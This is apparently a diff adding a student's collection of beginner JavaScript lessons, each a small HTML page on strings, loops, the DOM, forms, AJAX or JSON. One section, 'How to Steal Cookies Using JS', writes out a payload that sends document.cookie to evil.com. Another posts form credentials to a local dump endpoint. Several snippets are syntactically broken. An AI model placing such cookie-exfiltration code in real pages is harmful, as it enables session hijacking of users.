@@ -1,0 +1,2660 @@
+
+<p>Functions</p>
+
+<html>
+<head>
+<title> hackers Creed </title>
+</head>
+<body>
+<script>
+function imran()
+{
+alert(0);
+}
+</script>
+
+<input type=button value="CLick me" onclick="imran()">
+
+</body>
+</html>
+
+
+
+
+
+<p>Creating Objects</p>
+<html>
+<head>
+<title> hackers Creed </title>
+</head>
+<body>
+<script>
+var imran=
+{
+ name:"imran",
+ usn:"IHK16cs055",
+ age:20,
+ haircolor:"brown"
+};
+alert(imran.usn);
+document.write(imran.haircolor);
+</script>
+
+
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+.<p>Returning Values</p>
+<html>
+<head>
+<title> hackers Creed </title>
+</head>
+<body>
+<script>
+
+
+
+
+
+var imran=
+{
+ firstname:"imran",
+ lastname: "nazir",
+ usn:"IHK16cs055",
+    age:20,
+ haircolor:"brown",
+ fullname: function ()
+ {
+   document.write(imran.firstname+ " " +imran.lastname);
+ }
+};
+imran.fullname();
+</script>
+
+
+
+
+
+<script>
+var imxx=
+{
+ name: "imran",
+ class:6,
+ rollno:25,
+  age:"Nine Years",
+all: function()
+{
+  return "</p>"+imxx.name+"</p>"+imxx.class+"</p> "+imxx.rollno;
+}
+}
+document.write(imxx.all())
+</script>
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+.
+
+<p>String Manipulation</p>
+<html>
+<head>
+<title> hackers Creed </title>
+</head>
+<body>
+<script>
+
+//Declared variable
+var name = "my name is imran";
+
+
+//Seaching...
+document.write(name.indexOf("n"))
+//Returns the index of the character n
+document.write(name.search("is"))
+//searchs string "is" ind string name
+
+//Cute and slice Fucntion...
+document.write(name.slice(0,6));
+//slices form index 0 to 6
+document.write(name.substring(0,6));
+//slices form index 0 to 6
+document.write(name.substr(0,6));
+//slices form index 0 to 6
+document.write("</p>")
+document.write(name.slice(5));
+//slices from 0-5 and prints all after that
+document.write("</p>")
+document.write(name.substr(5));
+//slicses from 0-5 and prints all after that
+
+
+
+
+
+/* JS Regex
+/pattern/Regex
+Eg: /ImRan/i
+here
+ImRan is The pattern
+i is The regular Expression
+*/
+
+var str="This is an New String and String is Set Set";
+//Sring replace fucntions
+document.write(name.replace("imran","nazir"));
+//replaces imran with nazir in string name
+document.write("</p>")
+
+document.write(str.replace(/StRing/i,"Numbers"));
+//Using i flag for case Sensitivity all the strings will be replaced no matter of their cases
+
+document.write(str.replace(/String/g,"numbers"))
+//replaces all occurances
+
+
+
+
+
+
+
+
+//upper-lower case String
+var name="imran";
+var name2="Nazir"
+var name3="ImraN nAzIr"
+
+document.write(name.toUpperCase())
+document.write(name2.toUpperCase())
+document.write(name)
+</script>
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<p> Numbers Methods </p>
+
+<html>
+<head>
+<title> hackers Creed </title>
+</head>
+<body>
+<script>
+
+var imx=10.775;
+document.write(imx.toFixed(0))
+//How man decimal you need after the no
+document.write("</p>")
+document.write((10*20).valueOf());
+//().valueOf is an fucntion to calculate the values
+
+//Print some random numbers
+document.write("</p>")
+imran=Math.random();
+document.write(imran);
+
+
+//Rounds the value
+document.write("</p>")
+imran=Math.round(10.7);
+document.write(imran);
+
+
+
+
+//Rounds Up
+document.write("</p>")
+imran=Math.ceil(5.4);
+document.write(imran);
+
+
+
+//Rounds Down
+document.write("</p>")
+imran=Math.floor(9.9);
+document.write(imran);
+
+
+
+
+
+//Power Function
+document.write("</p>")
+imran=Math.pow(2,3);
+document.write(imran);
+
+
+
+//Finds the square root
+document.write("</p>")
+imran=Math.sqrt(100);
+document.write(imran);
+
+
+
+
+document.write("</p>")
+imran=Math.random();
+document.write(Math.PI);
+
+
+
+
+
+
+
+
+
+</script>
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+.
+<p>Array Operations</p>
+
+<html>
+<head>
+<title> hackers Creed </title>
+</head>
+<body>
+<script>
+
+var names=["imran","nazir","parray"] //simple array
+names.push("Pora"); //push "pora" at the back
+var x = names.pop(); // pop last element
+document.write(x); //write to document.
+document.write("</p>The Names are:"+names) //prints all the names in array
+
+names.shift(); //shifts the first element
+alert(names[0]); //alerts Nazir
+
+delete names[0]; //delete element 0 in the array
+
+)
+
+</script>
+<script>
+var ohraaj=["Hafeez","19","Black"]
+ohraaj.splice(1,0,"Imran","Nazir");
+
+</script>
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+.<p>If Else</p>
+<html>
+<head>
+<title> hackers Creed </title>
+</head>
+<body>
+<script>
+
+var imran=5;
+if(imran>5)
+{
+  document.write("imran is greater than 5");
+
+}
+else if (imran==5) {
+  document.write("Imran is equal to 5");
+}
+else {
+  document.write("It is Less than Five");
+}
+
+</script>
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>Ternery Operator
+<html>
+<head>
+<title> hackers Creed </title></head>
+<body>
+  <script>
+
+let imran;
+age=prompt("Enter your age");
+let allow=(age>18)?true:false;
+let after=18-age;
+(allow==true)?alert("Allowed You can apply For Driving Licence"):alert("You can apply after "+after+" years");
+</script>
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+.<p>Switch case </p>
+
+<html>
+<head>
+<title> hackers Creed </title>
+</head>
+<body>
+  <center>
+    <h1>
+<script>
+
+var date=new Date().getDay();
+switch(date)
+{
+ case 1:
+ document.write("It is Monday ");
+ break;
+
+ case 2:
+ document.write("It is tuesday");
+ break;
+
+ case 3:
+ document.write("It is Wenday");
+ break;
+
+ case 4:
+ document.write("It is Thirsday");
+ break;
+
+ case 5:
+ document.write("It is Friday");
+ break;
+
+ case 6:
+ document.write("It is saturday");
+ break;
+
+ case 7:
+ document.write("It is sunday");
+ break;
+
+
+
+
+
+
+}
+</script>
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+.
+<p> For Loop  </p>
+<html>
+<head>
+<title> hackers Creed </title></head>
+<body>
+<p id=cc> </p>
+<script>
+var imran=["imran","nazir","Parray","pora"]
+for (var i = 0; i < imran.length; i++) {
+  document.write("Name["+i+"]:"+imran[i]+"</p>");
+}
+</script>
+
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+.
+<p> For In Loop </p>
+<!-- In this loop a variable x is used to go inside the properties of the
+object and slect the properties in the squescial order !-->
+
+
+<html>
+<head>
+<title> hackers Creed </title></head>
+<body>
+<p id=cc> </p>
+<script>
+var imran=
+{
+  firstname:"imran",
+  secondname:"Nazir",
+  haircolor:"Brown",
+  height:5.7
+}
+
+for(x in imran)
+{
+ document.write(imran[x]+"</p>");
+}
+</script>
+
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+.<p>While Loop</p>
+
+<html>
+<head>
+<title> hackers Creed </title></head>
+<body>
+<p id=cc> </p>
+<script>
+x=0;
+while(x<10)
+{
+  var y=x+1;
+  document.write(y);
+  x++;
+}
+</script>
+
+
+
+<script>
+var imran=["imran","nazir","Parray","pora"]
+var x=0;
+while (x<imran.length)
+{
+  document.write(imran[x]+"<br>");
+  x++;
+}
+
+  </script>
+
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+.
+<p>Do while Loop</p>
+<html>
+<head>
+<title> hackers Creed </title></head>
+<body>
+<p id=cc> </p>
+
+
+<script>
+var imran=["imran","nazir","Parray","pora"]
+x=0;
+do {
+  document.write(imran[x]+"<br>");
+  x++;
+} while (x<imran.length);
+
+  </script>
+
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+.</p>getElementsByTagName
+
+
+<html>
+<head>
+<title> hackers Creed </title></head>
+<body>
+<h1> I am H1</h1>
+<h1>I am H2 </h1>
+
+<script>
+//This method is used to get the html element by thir tags
+//it will find all the specified tags and lets us use them as array
+//like here in the example i am finding and h1 tags and
+//assigining them to an variable imxx and then we can use those as arrays
+//we can also use itterations (loops) for manipulatiing the information.
+document.getElementsByTagName("h1");
+var imxx=document.getElementsByTagName("h1");
+imxx[0].innerHTML="Hello world !";
+
+for (var i = 0; i < imxx.length; i++) {
+  imxx[i].innerHTML= "<input type=text> "+i;
+}
+</script>
+
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+.</p>How to Steal Cookies Using JS
+<html>
+<head>
+<title> hackers Creed </title></head>
+<body>
+
+<script>
+document.cookie="Sessiod=sasdasdsds";
+<script>
+//this redricts the vicime to given url
+document.location="http://evil.com/"+document.cookie;
+<img src="http://evil.com/"+document.cookie; >
+</script>
+
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+.</p> Try and Catch Method
+<html>
+<head>
+<title> hackers Creed </title></head>
+<body>
+
+
+<script>
+//This method is called an try and catch method
+//it executes Try block
+//if Error happens it stored that error in "e" and
+//executes the catch block
+//and finally executes the finally block.
+//finally block is executed in both the cases whether
+//the error happends or not
+function hell()
+{
+  alert("hell");
+}
+try {
+  hell();
+} catch (e) {
+alert(e);
+} finally {
+alert("Completed");
+}
+
+</script>
+
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+.</p>Array Sorting
+<html>
+<head>
+<title> hackers Creed </title></head>
+<body>
+  <script>
+
+//String Sort
+let names=["imran","Nazir","hafeez","Mubashir"]
+names.sort(); //sorts the elements alphbatically
+document.write(names);
+document.write("<br>");
+
+//Reverse String
+names.reverse();
+document.write(names);
+document.write("<br>");
+
+
+
+//Numric sort
+//sorts Acending order
+var points = [40, 100, 1, 5, 25, 10];
+var u=points.sort(function(a, b){return a - b});
+document.write(u);
+
+
+//sort in Decending Order
+var num=[10,20,30,55,50,48,0,55,157];
+var x=num.sort(function(a,b){return b-a});
+document.write(x);
+
+
+
+
+//Highest In The array
+let numbers=[10,25,66,87,33,55,69,87,2,25,36];
+let n=numbers.sort(function(a,b){return a-b});//Sorts in Acending
+document.write(numbers[numbers.length-1]);//Prints Last Element
+
+
+
+
+
+
+//Lowest In The array
+//Highest In The array
+let numberx=[10,25,66,87,33,55,69,87,2,25,36];
+let n=numberx.sort(function(a,b){return a-b});//Sorts in Acending
+document.write(numberx[0]);//Prints Last Element
+
+
+
+
+//Find Highest
+let nux=[10,25,9,8,6,554,58,21,25];
+u=Math.max.apply(null,nux);
+document.write(u);
+
+
+//Find Lowest
+let nux=[10,25,9,8,6,554,58,21,25];
+u=Math.min.apply(null,nux);
+document.write(u);
+
+
+
+
+
+</script>
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+.
+</p>BitWise Operators
+<html>
+<head>
+<title> hackers Creed </title></head>
+<body>
+<script>
+document.write(5&1);//0101 & 0001 =0001=1
+document.write(5|1);
+document.write(~5);
+document.write(5^2);
+
+
+</script>
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<br> Forms in JS
+<html>
+<head>
+  <head>
+
+  <script>
+  //IsEmpty Validation
+  function valid()
+  {
+    var x=document.forms["login"]["email"].value;
+    if(x=="")
+    {
+      alert("Please Enter Your Email");
+      return false;
+
+    }
+  }</script>
+
+</head>
+
+<body>
+  <form name="login" action=/hello.php onsubmit="return valid();" method="get"><br>
+  <input type="text" name="email"><br>
+  <input type="text" name="password"><br>
+  <input type="submit" name="submit" value="Submit"><br>
+</form>
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<br>Required tag
+<html>
+<head>
+</head>
+<body>
+  <form name="login" action=/hello.php method="get"><br>
+  <input type="text" name="num" required><br>
+  <input type="Submit">
+</form>
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+.
+<br>Input Validation
+
+<html>
+<head>
+
+<script>
+function imran()
+{
+var x=document.getElementById("imxx"); //finding the text box and assigining to x
+if(!x.checkValidity()) //if Validation is false
+{
+  alert(x.willValidate) //alert can we validate
+alert(x.validationMessage); //alert the err msg
+}
+else {
+  alert("OK"); //else ok
+}
+}
+</script>
+
+</head>
+<body>
+
+<input type="number" id="imxx" min="200" max="300" required>
+<!-- The input data in the input box should be 200-300 !-->
+<button onclick="imran()">Submit</button>
+<!-- Created an text box and an submit button
+and i am calling an imran() function onclick event
+!-->
+</form>
+
+</form>
+</body>
+</html>
+Extra:
+validity-----Contains boolean properties related to the validity of an input element.
+validationMessage -----	Contains the message a browser will display when the validity is false.
+willValidate -----	Indicates if an input element will be validated.
+
+Property	Description
+customError ----	Set to true, if a custom validity message is set.
+patternMismatch -----	Set to true, if an element's value does not match its pattern attribute.
+rangeOverflow	----- Set to true, if an element's value is greater than its max attribute.
+rangeUnderflow	----- Set to true, if an element's value is less than its min attribute.
+stepMismatch----- 	Set to true, if an element's value is invalid per its step attribute.
+tooLong	---- Set to true, if an element's value exceeds its maxLength attribute.
+typeMismatch -----	Set to true, if an element's value is invalid per its type attribute.
+valueMissing	----- Set to true, if an element (with a required attribute) has no value.
+valid	----- Set to true, if an element's value is valid.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+.<br>Different  Method to Find Html element in Js
+<html>
+<head>
+</head>
+<body>
+  <p id="imxx">Hello</p>
+<p id="imxx2">Hello2</p>
+<p name="imxx3">Hello3</p>
+<p class="imxx4">Hello4</p>
+    <script>
+document.getElementById("imxx").innerHTML="I am 1st Paragraph";
+document.getElementsByTagName("p")[1].innerHTML="I am 2nd Paragraph";
+document.getElementsByName("imxx3")[0].innerHTML="Hell No ";
+document.getElementsByClassName("imxx4")[0].innerHTML="I am Get Element By Class"
+    </script>
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+.<br>Change Html Attiribute Values with JS
+<html>
+<head>
+</head>
+<body>
+<a id="imxx" href="http://www.google.com">Google.com</a>
+<img id="imx2" src="/imran.png" >
+    <script>
+    document.getElementById("imxx").href="http://www.evil.com";
+    document.getElementById("imx2").src="/Mubashir.png";
+    </script>
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+.<br> Add Eveent Listner
+<!--
+
+The addEventListener() method attaches an event handler to the specified element.
+The addEventListener() method attaches an event handler to an element without overwriting existing event handlers.s
+You can add many event handlers to one element.
+You can add many event handlers of the same type to one element, i.e two "click" events.
+You can easily remove an event listener by using the removeEventListener() method.
+
+
+
+element.addEventListener(event, function, useCapture);
+The first parameter is the type of the event (like "click" or "mousedown").
+The second parameter is the function we want to call when the event occurs.
+This parameter is optional.The third parameter is a boolean value specifying whether to use event bubbling or event capturing.
+!-->
+
+
+<html>
+<head>
+</head>
+<body>
+<button id="imxx" onmouseover="alert(0)">Click Me </button>
+    <script>
+document.getElementById("imxx").addEventListener("click",function(){alert("Hello World!");});
+//it adds an New Event onclick to the element with id imxx
+//it does not overwrights the previous event.
+
+    </script>
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+.
+<html>
+<head>
+</head>
+<body>
+<h3> windows.object </h3>
+<button id="imxx" onmouseout="window.open()"> Open an New Windows </button><br>
+<button id="imxx2" onmouseout="windows.close()"> CLose Window </button><br>
+
+
+
+<h3> Screen Object </h3>
+<button id="imxx3" onmouseout="alert(screen.height)"> See Screen Height </button><br>
+<button id="imxx4" onmouseout="alert(screen.availWidth)"> Screen Width </button><br>
+
+
+<h3> Windows.Location Object </h3>
+<button id="imxx5" onmouseout="alert(window.location.href)">  windows.location.href</button><br>
+<button id="imxx6" onmouseout="alert(window.location.hostname)"> window.location.hostname </button><br>
+<button id="imxx6" onmouseout="alert(window.location.pathname)"> window.location.pathname </button><br>
+<button id="imxx6" onmouseout="alert(window.location.protocol)"> window.location.protocol </button><br>
+<button id="imxx6" onmouseout="alert(window.location.port)"> window.location.port </button><br>
+<button id="imxx6" onmouseout="New()"> window.location.assign </button><br>
+<script>
+function New()
+{
+  window.location.assign("http://www.google.com");
+
+}
+</script>
+
+
+<br>
+<h3>window.history Object</h3>
+<button id="imxx6" onmousemove="history.back()"> history.back() </button><br>
+<button id="imxx6" onmousemove="history.back()"> history.forward() </button><br>
+<!-- history.back() selects the last url in the history and visits that
+and history.forward() is equal to presssing forward button  in browser !-->
+
+
+
+<h3>window.navigator Object </h3>
+<button id="imxx6" onmousemove="alert(navigator.cookieEnabled)"> navigator.cookieEnabled </button><br>
+<button id="imxx6" onmousemove="alert(navigator.appName)"> navigator.appName </button><br>
+<button id="imxx6" onmousemove="alert(navigator.appCodeName)"> navigator.appCodeName </button><br>
+<button id="imxx6" onmousemove="alert(navigator.product)"> navigator.product </button><br>
+<button id="imxx6" onmousemove="alert(navigator.appVersion)"> navigator.appVersion </button><br>
+<button id="imxx6" onmousemove="alert(navigator.platform)"> navigator.platform </button><br>
+<button id="imxx6" onmousemove="alert(navigator.language)"> navigator.language </button><br>
+<button id="imxx6" onmousemove="alert(navigator.onLine)"> navigator.onLine </button><br>
+<button id="imxx6" onmousemove="alert(navigator.javaEnabled())"> navigator.javaEnabled() </button><br>
+<br>
+<br>
+<a href="https://www.w3schools.com/js/js_window_navigator.asp">Click Here for Refrences</a>
+
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+.
+<br>Alert Boxes
+<!--
+JavaScript has three kind of popup boxes: Alert box, Confirm box, and Prompt box.
+//Alert()
+An alert box is often used if you want to make sure information comes through to the user.
+
+//Confirm()
+A confirm box is often used if you want the user to verify or accept something.
+When a confirm box pops up, the user will have to click either "OK" or "Cancel" to proceed.
+If the user clicks "OK", the box returns true. If the user clicks "Cancel", the box returns false.
+
+//prompt()
+A prompt box is often used if you want the user to input a value before entering a page.
+!-->
+
+<html>
+<head>
+</head>
+<body>
+
+
+//body
+
+
+
+<script>
+//alert
+alert(0); //alerts and pop up with 0
+
+
+//confirm
+if(confirm("Do You Want to Go to Google"))
+{
+  document.location=window.location.href;
+}
+else {
+
+}
+
+
+
+
+//prompt()
+var x=prompt("Please Enter Your Name");
+document.write("<h2>"+" Welcome Mr. "+x+"")
+
+</script>
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<br>Js Timing Events
+<!--
+The two key methods to use with JavaScript are:
+setTimeout(function, milliseconds)
+Executes a function, after waiting a specified number of milliseconds.
+setInterval(function, milliseconds)
+Same as setTimeout(), but repeats the execution of the function continuously.
+!-->
+
+
+<html>
+<head>
+  <script>
+  var imxx=setInterval(hello,3000);
+  function hello()
+  {
+
+    confirm("Are You Ok !");
+  }
+  </script>
+
+
+  <script>
+  function imran()
+  {
+    alert("Heyyy !");
+  }
+
+  </script>
+</head>
+<body>
+<!--
+setTimeout(imran, 3000);
+
+it executes the given function in the first parameter after wating for the
+given amount of milli seconds in the second parameter
+
+Note: In the First Parameter Donot Pass Function name with Paranthesis "Imran()""
+      pass it will onlin name "imran"
+!-->
+
+
+  <br><h4>setTimeout(Function_Name, MilliSeconds);</br>
+  <button onmouseout="setTimeout(imran, 3000);" > Click me</butto>
+<!--
+setInternal(imran, 3000);
+
+it executes the given function in the first parameter everyTime after wating for the
+given amount of milli seconds in the second parameter
+
+Note: In the First Parameter Donot Pass Function name with Paranthesis "Imran()""
+      pass it will onlin name "imran"
+!-->
+<br>
+<br><br><br><br>
+<button onmouseover="imxx"> setInterval</button><br>
+<button onmouseover="clearInterval(imxx)">Stop Interval</button><br>
+
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+.
+<br>JSON to JS
+<html>
+<head>
+<title> hackers Creed </title></head>
+<body>
+<script>
+/*
+
+//This is an Json Object
+
+{"names":[
+  {"firstname":"Imran", "lastname":"Nazir"}
+  {"firstname":"Mubashir", "lastname":"Parray"}
+  {"firstname":"Zubair", "lastname":"Parray"}
+]}
+
+
+*/
+
+//Converting Abouve Json Object into The JS Object
+//Fallow The Steps
+//1-Add '' on Every Line
+//2-Add + on Every New Line Except Last One
+//3-Add , To the End of Every Line.
+
+
+var x='{"names":['
++'{"firstname":"Imran", "lastname":"Nazir"},'
++'{"firstname":"Mubashir", "lastname":"Parray"},'
++'{"firstname":"Zubair", "lastname":"Parray"}]}';
+
+var obj=JSON.parse(x);//BuiltIn Function to Parse JSON Data
+document.write(obj.names[1].firstname)
+</script>
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+.<br>Js XMLHttpRequest Object
+
+
+
+
+
+
+
+
+
+
+<br>Getting Data from the server using XMLHttpRequest
+<!DOCTYPE html>
+<html>
+<body>
+
+<h2>The XMLHttpRequest Object</h2>
+
+<button type="button" onclick="loadDoc()">Request data</button>
+
+<p id="demo"></p>
+
+
+<script>
+function loadDoc() {
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+      document.getElementById("demo").innerHTML = this.responseText;
+    }
+  };
+  xhttp.open("GET", "imran.txt", true);
+  xhttp.send();
+}
+</script>
+
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<br>Sending Data using XMLHttpRequest
+<!DOCTYPE html>
+<html>
+<body>
+
+<h2>The XMLHttpRequest Object</h2>
+
+<button type="button" onclick="loadDoc()">Request data</button>
+
+<p id="demo"></p>
+
+
+<script>
+var url="http://127.0.0.1/dump-requests-post/dumprequest.php";
+function loadDoc() {
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+      document.getElementById("demo").innerHTML = this.responseText;
+    }
+  };
+  xhttp.open("POST",url, true);
+  xhttp.send("Hello World");
+}
+</script>
+
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<br>Send Forms to Server using XMLHttpRequest
+<!DOCTYPE html>
+<html>
+<head>
+<body>
+
+<script>
+function imxxx()
+{
+  var imran = document.forms["login"]["username"].value;
+  var imran2=document.forms["login"]["password"].value;
+  var url="http://127.0.0.1/dump-requests-post/dumprequest.php";
+ var xhttp=new XMLHttpRequest();
+ xhttp.onreadystatechange=function(){
+
+ }
+  xhttp.open("POST",url,true);
+  xhttp.send("Username:"+imran+" " + "Pass:"+imran2);
+}
+  </script>
+
+</head>
+<body>
+
+<h2>Sending Information to server using  XMLHttpRequest Object</h2>
+<form name="login" method="POST">
+<input type="text" name="username"/><br>
+<input type="text" name="password" /><br>
+<input type=Submit onclick="imxxx()"><br>
+</form>
+
+
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<br>Handling Multiple XMLHttpRequest in WebPages
+<!DOCTYPE html>
+<html>
+<body>
+
+<h2>The XMLHttpRequest Object</h2>
+
+<input type="button" value="Button 1" onclick=imxx("imran.txt") />
+<input type="button" value="Button 1" onclick=imxx("test.html") />
+
+<h1 id="demo">Hello World</h1>
+<script>
+function imxx(url){
+var xhttp;
+xhttp=new XMLHttpRequest();
+xhttp.onreadystatechange=function()
+{
+  document.getElementById("demo").innerHTML=xhttp.responseText;
+  }
+xhttp.open("GET",url,true);
+xhttp.send();
+}
+</script>
+
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+.
+<br>MAgic of Ajax With PHP
+<!DOCTYPE html>
+<html>
+<body>
+<head>
+<script>
+
+function imran()
+{
+var imx1=document.getElementById("imxx");
+var imx2=imx1.value;
+
+var request=new XMLHttpRequest();
+request.onreadystatechange=function(){
+  document.getElementById("para").innerHTML=request.responseText;
+}
+request.open("GET","http://127.0.0.1/Practice/hint.php?q="+imx2,true);
+request.send();
+}
+
+</script>
+</head>
+<body>
+  <h1>Please Enter Your Name:</h1>
+  <input type="text" id="imxx" onkeyup="imran()"/><br>
+ <h4>Results Found in DataBase:
+<b style="color:green" id="para" >  </b>
+
+<script>
+
+</script>
+<body>
+  <body background="https://www.walldevil.com/wallpapers/a19/6614-wallpaper-resources-titles-backround-wallpapers-images-lol-background.jpg"/>
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+.<br>Get Response Headers
+<!DOCTYPE html>
+<html>
+<body>
+<head>
+<script>
+function imran()
+{
+var request=new XMLHttpRequest();
+request.onreadystatechange=function(){
+  document.getElementById("para").innerHTML=this.getAllResponseHeaders();
+}
+request.open("GET","imran.txt",true);
+request.send();
+}
+
+</script>
+<body>
+
+<input type="button" onmouseout="imran()" />
+<p id="para" >Text Here ! </p>
+
+
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+.<br>Get a Specific Response header
+<!DOCTYPE html>
+<html>
+<body>
+<head>
+<script>
+function imran()
+{
+var request=new XMLHttpRequest();
+request.onreadystatechange=function(){
+  document.getElementById("para").innerHTML=this.getResponseHeader("Server");
+}
+request.open("GET","imran.txt",true);
+request.send();
+}
+
+</script>
+<body>
+
+<input type="button" onmouseout="imran()" />
+<p id="para" >Text Here ! </p>
+
+
+</body>
+</html>
+
+
+-------------------------------------------------------------------------------
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<br>Accessing Data in JSOn Objects
+
+<!DOCTYPE html>
+<html>
+<body>
+
+<p>How to loop through all properties in a JSON object.</p>
+
+<p id="demo"></p>
+
+<script>
+var myObj = { "name":"John", "age":30, "car":null };
+for (x in myObj) {
+    document.getElementById("demo").innerHTML += myObj[x] + "<br>";
+}
+</script>
+
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+.
+<br>Nester Json
+<!DOCTYPE html>
+<html>
+<body>
+<p id="demo"></p>
+
+<script>
+var imxx = {
+  "name":"John",
+   "age":30,
+    "car":{
+      "car1":"Farari",
+      "car2":"BMW",
+      "car3":"flat",
+    }
+  };
+alert(imxx.car.car1);
+</script>
+
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<br>Deleting Values in JSon object
+<!DOCTYPE html>
+<html>
+<body>
+<p id="demo"></p>
+
+<script>
+var imxx = {
+  "name":"John",
+   "age":30,
+    "car":{
+      "car1":"Farari",
+      "car2":"BMW",
+      "car3":"flat",
+    }
+  };
+  delete imxx.cars.car2;
+  //Error
+alert(imxx.car.car2);
+</script>
+
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<br>Array in JSON
+<!DOCTYPE html>
+<html>
+<body>
+<p id="demo"></p>
+
+<script>
+var imxx = {
+  "name":"John",
+   "age":30,
+    "car":{
+      "car1":"Farari",
+      "car2":"BMW",
+      "car3":"flat",
+    }
+  };
+//this can be writen in other way
+imran={
+  "name":"irman",
+  "Age":21,
+  "class":"B Tech",
+  "Passion":"Hacking",
+  "cars":["Farari","BMW","Flat"]
+}
+//alerts BMW
+alert(imran.cars[1]);
+</script>
+
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<br>Looping Through Json Properties
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+imran={
+  "name":"irman",
+  "Age":21,
+  "class":"B Tech",
+  "Passion":"Hacking",
+  "cars":["Farari","BMW","Flat"]
+}
+//alerts BMW
+for (x in imran.cars)
+{
+alert(imran.cars[x]);
+}
+</script>
+
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+.
+<br>Sending Data to The Server using JSON
+
+<!DOCTYPE html>
+<html>
+<body>
+<head>
+
+
+<body>
+  <script>
+  var names= { "name":"imran", "age":21, "city":"Earth"};
+  var Jsun = JSON.stringify(names);
+  alert(Jsun);
+
+  //Json Handler
+  window.location="https://www.w3schools.com/js/demo_json.php?x="+Jsun;
+
+
+
+
+  </script>
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<br>Saving JSon Data to localStorage
+<!DOCTYPE html>
+<html>
+<body>
+<head>
+
+
+<body>
+  <script>
+  //Creating an json object
+imran={"Name":"imran", "class":12, "Age":25, "haircolor":"Brown"}
+//converting it to the string
+var imran2=JSON.stringify(imran);
+//saving it to the local storage of the browser with the name myJson.
+localStorage.setItem("myJson",imran2);
+//Now you can go to chrome as developer mode to see if the paticular data is
+//stored in the local memory.
+  </script>
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
